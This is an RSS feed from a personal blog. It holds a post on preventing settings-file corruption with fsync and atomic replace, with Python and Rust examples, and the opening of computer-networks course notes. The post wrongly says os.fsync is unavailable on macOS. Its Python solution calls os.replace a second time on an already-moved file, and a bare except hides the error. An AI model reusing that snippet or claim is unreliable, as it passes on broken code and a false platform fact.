<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Computer-Science on ELL Blog</title>
    <link>https://blog.elijahlopez.ca/tags/computer-science/</link>
    <description>ELL Blog (Computer-Science)</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Sun, 09 Feb 2025 14:07:09 -0500</lastBuildDate>
    
    <atom:link href="https://blog.elijahlopez.ca/tags/computer-science/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>PSA: Avoid Data Corruption by Syncing to the Disk</title>
      <link>https://blog.elijahlopez.ca/posts/data-corruption-atomic-writing/</link>
      <pubDate>Sun, 09 Feb 2025 14:07:09 -0500</pubDate>
      
      <guid>https://blog.elijahlopez.ca/posts/data-corruption-atomic-writing/</guid>
      <description>&lt;p&gt;A few weeks ago, I was playing Call of Duty Black Ops 6 after a new update was released. Mid-game, my laptop encountered a Blue Screen of Death. When my laptop rebooted and I went to play music, I found that &lt;a href=&#34;https://github.com/elibroftw/music-caster/&#34;&gt;Music Caster&lt;/a&gt; - Music Player I developed and daily drive - had its settings reset. To fix this bug, I was planning on implementing a &lt;em&gt;backup before overwriting&lt;/em&gt; pattern, but then realized I should use this problem as an opportunity to benchmark the leading Large Language Models found on &lt;a href=&#34;https://livecodebench.github.io/leaderboard.html&#34;&gt;LiveCodeBench&lt;/a&gt;. Among the models I tested, only &lt;em&gt;Deepseek R1&lt;/em&gt; enlightened me with the wisdom of the flushing the disk cache via a call to &lt;code&gt;os.fsync&lt;/code&gt; (Python). Even then, it did not realize that os.fsync was not available on macOS, but that&amp;rsquo;s a minor fault. I subsequently checked another code base (Rust) I was working on for the same bug, and lo and behold, it was missing a call to sync the disk cache! Thanks to my humble benchmark of DeepSeek R1, two applications are now safer from potential data corruption bugs.&lt;/p&gt;
&lt;p&gt;I have included two code reviews below, one in Python and one in Rust. These illustrate the specific problem on how a data corruption bug show up in code, and an as best as I can solution to avoid the bug. Feel free to code review my solutions! My goal is a collectively approved solution. The scenario involves saving to a config-like file. For context, in my music player&amp;rsquo;s case, it would overwrite the file very often in order to persist the playback progress.&lt;/p&gt;
&lt;h3 id=&#34;python-code-review&#34; &gt;Python Code Review
&lt;span&gt;
    &lt;a href=&#34;#python-code-review&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;This is a naive implementation to saving a config file. With such a verbose introduction, it&amp;rsquo;s easy to tell there is a bug if the system crashes. What&amp;rsquo;s not easy is getting the implementation to the proposed solution. It&amp;rsquo;s easy to say &amp;ldquo;write to a temporary file and then replace atomically,&amp;rdquo; and harder to implement the solution flawlessly.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;open&lt;/span&gt;(SETTINGS_FILE, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;, encoding=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt; outfile:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        json.dump(settings, outfile, indent=&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;, escape_forward_slashes=&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;False&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#bbb&#34;&gt;OSError&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt; e:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pass&lt;/span&gt; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# omitted&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;br&gt;
&lt;details&gt;&lt;summary&gt;Solution&lt;/summary&gt;
&lt;ol&gt;
&lt;li&gt;Write to a temporary file. &lt;code&gt;NamedTemporaryFile&lt;/code&gt; is the way to go as it also has more secure default file permissions (owner-only permissions) than simply opening a file to write to it. Note that &lt;code&gt;SETTINGS_FILE&lt;/code&gt; is an instance of &lt;code&gt;pathlib.Path&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Ensure that this temporary file won&amp;rsquo;t be deleted upon close since we need to replace the persistent settings file&lt;/li&gt;
&lt;li&gt;Ensure that if there is a program buffer regarding writing to files, that this buffer is flushed&lt;/li&gt;
&lt;li&gt;Ensure that the OS disk cache is flushed to the physical disk via &lt;code&gt;os.fsync&lt;/code&gt; and &lt;code&gt;F_FULLFSYNC&lt;/code&gt; on macOS
&lt;ul&gt;
&lt;li&gt;Unfortunately Python&amp;rsquo;s &lt;a href=&#34;https://docs.python.org/3/library/os.html#os.fsync&#34;&gt;&lt;code&gt;os.fsync&lt;/code&gt;&lt;/a&gt; is unavailable on macOS, which is a great example of it&amp;rsquo;s lack luster cross platform ability. On macOS, we need to use &lt;a href=&#34;https://github.com/rust-lang/rust/commit/d602a6b942e32f4f9a36b6c44471cfcd80a81bb6#diff-8ab68a7768c78998ca029efe4870677bc8722b5ac0bed5fb68944086202fe0e0R534&#34;&gt;&lt;code&gt;fcntl.fcntl(tmp_file.fileno(), fcntl.F_FULLFSYNC)&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;I have made a &lt;a href=&#34;https://discuss.python.org/t/call-f-fullfsync-in-os-fsync-for-macos/79332&#34;&gt;post&lt;/a&gt; on the Python forums asking to support fsync on macOS similar to Rust&amp;rsquo;s implementation of sync_all. I would appreciate some likes on this.&lt;/li&gt;
&lt;li&gt;Technically, you could also write three if statements and use &lt;a href=&#34;https://docs.python.org/3/library/os.html#os.fdatasync&#34;&gt;os.fdatasync&lt;/a&gt; when running on Unix, but I&amp;rsquo;d argue it&amp;rsquo;s better to migrate away from Python at that point!&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Close the temporary file&lt;/li&gt;
&lt;li&gt;Atomically replace the settings file with the temporary file&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;tempfile&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;import&lt;/span&gt; NamedTemporaryFile
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;fcntl&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#bbb&#34;&gt;ImportError&lt;/span&gt;:  &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# not supported in Windows&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pass&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    tmp_file = NamedTemporaryFile(mode=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;, encoding=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;, prefix=SETTINGS_FILE.name, &lt;span style=&#34;color:#24909d&#34;&gt;dir&lt;/span&gt;=SETTINGS_FILE.parent, suffix=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;.tmp&amp;#39;&lt;/span&gt;, delete=&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;False&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    json.dump(settings, tmp_file, indent=&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;, escape_forward_slashes=&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;False&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# send to kernel buffer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    tmp_file.flush()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# inform OS to write to disk to avoid a situation where the file is replaced but not written to&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; platform.system() == &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;Darwin&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        fcntl.fcntl(tmp_file.fileno(), fcntl.F_FULLFSYNC)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        os.fsync(tmp_file.fileno())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    tmp_file.close()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# an atomic operation which avoids any settings file corruption at crash&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    os.replace(tmp_file.name, SETTINGS_FILE)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    settings_last_modified = os.path.getmtime(SETTINGS_FILE)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# this atomic operation ensures that a settings.file will exist if the system crashes before/after the system call&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    os.replace(tmp_file, SETTINGS_FILE)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#bbb&#34;&gt;OSError&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt; e:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pass&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/details&gt;
&lt;h3 id=&#34;rust-code-review&#34; &gt;Rust Code Review
&lt;span&gt;
    &lt;a href=&#34;#rust-code-review&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Can you spot the bug in this Rust code? Looks good to me. Right?&lt;/p&gt;
&lt;p&gt;This is the typically smart solution, however as I mentioned since the start of this article, there is an oversight! It&amp;rsquo;s a mistake even senior software engineers can make without an adequate understanding of how OS file system really works. We call flush as if the data will be flushed from the program buffer straight to the disk, but in reality, the data is flushed from the program buffer to the kernel buffer / disk cache! Therefore, we need to ensure that the data is synced to the disk before we call persist (which is an atomic replace/rename).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-rs&#34; data-lang=&#34;rs&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;use&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;tempfile::{NamedTempFile,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;PersistError};&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// inside a function called save
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;let&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;mut&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;file&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;NamedTempFile::new_in(&lt;span style=&#34;color:#40ffff&#34;&gt;MY_DIR&lt;/span&gt;)?;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;    &lt;/span&gt;file.write_all(&amp;amp;json)?;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;    &lt;/span&gt;file.flush()?;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;    &lt;/span&gt;file.persist(&lt;span style=&#34;color:#40ffff&#34;&gt;MY_DIR&lt;/span&gt;.join(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;config.json&amp;#34;&lt;/span&gt;))?;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;br&gt;
&lt;details&gt;&lt;summary&gt;Solution&lt;/summary&gt;
&lt;p&gt;To ensure that the file is synced to the disk before we persist the temporary file, call &lt;a href=&#34;https://doc.rust-lang.org/std/fs/struct.File.html#method.sync_data&#34;&gt;file.as_file_mut().sync_data()&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-rs&#34; data-lang=&#34;rs&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;use&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;tempfile::{NamedTempFile,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;PersistError};&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// inside a function called save
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;let&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;mut&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;file&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;NamedTempFile::new_in(&lt;span style=&#34;color:#40ffff&#34;&gt;MY_DIR&lt;/span&gt;)?;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;    &lt;/span&gt;file.write_all(&amp;amp;json)?;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;    &lt;/span&gt;file.flush()?;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;    &lt;/span&gt;file.as_file_mut().sync_data()?;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;    &lt;/span&gt;file.persist(&lt;span style=&#34;color:#40ffff&#34;&gt;MY_DIR&lt;/span&gt;.join(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;config.json&amp;#34;&lt;/span&gt;))?;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/details&gt;
</description>
    </item>
    
    <item>
      <title>CS 456 Computer Networks</title>
      <link>https://blog.elijahlopez.ca/posts/university/cs-456-computer-networks/</link>
      <pubDate>Tue, 07 May 2024 08:29:57 -0400</pubDate>
      
      <guid>https://blog.elijahlopez.ca/posts/university/cs-456-computer-networks/</guid>
      <description>&lt;h2 id=&#34;overview-of-the-internet&#34; &gt;Overview of the Internet
&lt;span&gt;
    &lt;a href=&#34;#overview-of-the-internet&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;open-systems-interconnection&#34; &gt;Open Systems Interconnection
&lt;span&gt;
    &lt;a href=&#34;#open-systems-interconnection&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;#physical-media-links&#34;&gt;Physical&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;fiber, cable, radio mediums that carry individual bits (smallest unit of data, 1 or 0)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#chapter-6-data-link-layer&#34;&gt;Data Link&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;organizes all the data being transmitted into datagrams (the network-layer packet is referred to as a datagram) and frames and enables node ⇆ node communication&lt;/li&gt;
&lt;li&gt;handles error detection and correction&lt;/li&gt;
&lt;li&gt;Ethernet, 802.11 (WIFI), point-to-point protocol (PPP)?&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#chapter-4--5-network-layer&#34;&gt;Network&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;the Internet Protocol (v4 and v6), and routing protocols for transferring packets to hosts&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#chapter-3-transport-layer-protocols&#34;&gt;Transport&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;TCP, UDP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#tcp-3-way-handshake&#34;&gt;Session&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;Manages connections between applications&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#tcp-security&#34;&gt;Presentation&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;Formats and encrypts data for the application layer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#chapter-2-application-layer-protocols&#34;&gt;Application&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;Network services&lt;/li&gt;
&lt;li&gt;HTTP, IMAP, SMTP, DNS&lt;/li&gt;
&lt;li&gt;Firewalls&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;chapter-1-overall-picture-of-computer-networking&#34; &gt;Chapter 1 Overall Picture of Computer Networking
&lt;span&gt;
    &lt;a href=&#34;#chapter-1-overall-picture-of-computer-networking&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;Circuit Switching Vs. Packet Switching, Access Networks, Physical Media, Network Delays, Protocol Layering, Internet architecture&lt;/p&gt;
&lt;p&gt;What is the internet and what is a protocol?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Network edge: hosts, access network, physical media&lt;/li&gt;
&lt;li&gt;Network core: packet/circuit switching, internet structure&lt;/li&gt;
&lt;li&gt;Performance: loss, delay, throughput&lt;/li&gt;
&lt;li&gt;Protocol layers, service models&lt;/li&gt;
&lt;li&gt;Security&lt;/li&gt;
&lt;li&gt;HIstory&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;nuts-and-bolts-view-of-the-internet&#34; &gt;Nuts and Bolts View of The Internet
&lt;span&gt;
    &lt;a href=&#34;#nuts-and-bolts-view-of-the-internet&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;billions of devices connected to each other&lt;/li&gt;
&lt;li&gt;hosts: end systems (runs network apps at internet&amp;rsquo;s &lt;em&gt;edge&lt;/em&gt;)
&lt;ul&gt;
&lt;li&gt;bit is the smallest unit&lt;/li&gt;
&lt;li&gt;throughput is capacity&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;packet switches: packet forwarder (routers and switches)&lt;/li&gt;
&lt;li&gt;communication links: bandwidth (fiber, copper, radio, satellite)&lt;/li&gt;
&lt;li&gt;networks: collection of devices, routers, links managed by an organization
&lt;ul&gt;
&lt;li&gt;internet service providers connect different networks&lt;/li&gt;
&lt;li&gt;regional connectivity, national, and international connectivity&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;internet-services-view&#34; &gt;Internet Services View
&lt;span&gt;
    &lt;a href=&#34;#internet-services-view&#34;&gt;
